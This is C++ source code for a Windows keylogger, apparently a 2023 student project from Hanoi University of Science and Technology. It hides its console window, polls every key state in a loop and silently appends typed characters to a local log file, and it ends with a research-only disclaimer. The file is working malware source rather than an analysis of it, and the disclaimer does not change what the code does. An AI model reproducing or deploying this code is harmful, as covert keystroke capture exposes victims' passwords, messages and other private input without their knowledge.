#define _WIN32_WINNT 0x0500//Indicates the lowest version of Windows that is supported. Change to value 0x0A00 for higher minimum required. 0x0500 indicates Windows 2000.
#include <Windows.h>//WinAPI Header
#include <winuser.h>//Keyboard Log Header
#include <fstream>//For log file.
#include "log.h"//misc
#include "ShiftedKeys.h"//misc
#include "SpecialKeys.h"//misc

using namespace std;

int main(){
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY;
	while (true){
		Sleep(5);
		for (int KEY = 8; KEY <=190; KEY++){
			if(GetAsyncKeyState(KEY) ==  -32767){
				if (SpecialKeys(KEY) == false){
					fstream LogFile;
					LogFile.open("log.txt", fstream::app);
					if (LogFile.is_open()){
						if (65 <= KEY && KEY <= 90){//characters
							if (Shift_isOn()^CapsLock_isOn()==0){
								KEY += 32;
								LogFile << char(KEY);
								LogFile.close();
							}
							else{
								LogFile << char(KEY);
								LogFile.close();
							}
						}
						else if (48<=KEY && KEY <= 57){//numbers
							if (Shift_isOn() == true){
								NumberKeyShift(KEY);
							}
							else{
								LogFile << char(KEY);
								LogFile.close();
							}
						}
						else{//misc
							if (Shift_isOn() == true){
								MiscKeyShift(KEY);
							}
							else{
								LogFile << KEY << ' ';
								LogFile.close();
							}
						}
					}
				}
				else{
					SpecialKeys(KEY);
				}
			}
		}		
	}
	return 0;
}
//Disclaimer: This project is for research/educational purpose only. We have no responsibilities if this project is used for any unethical or illegal actions by anyone apart from us.
// Generated and researched at School of Electronics and Telecommunication, Hanoi University of Science and Technology - 2023 by Nguyen Minh Tuan 20213737 & Mac Quang Huy 20213709 under the instruction of Dr. Hoang Quang Huy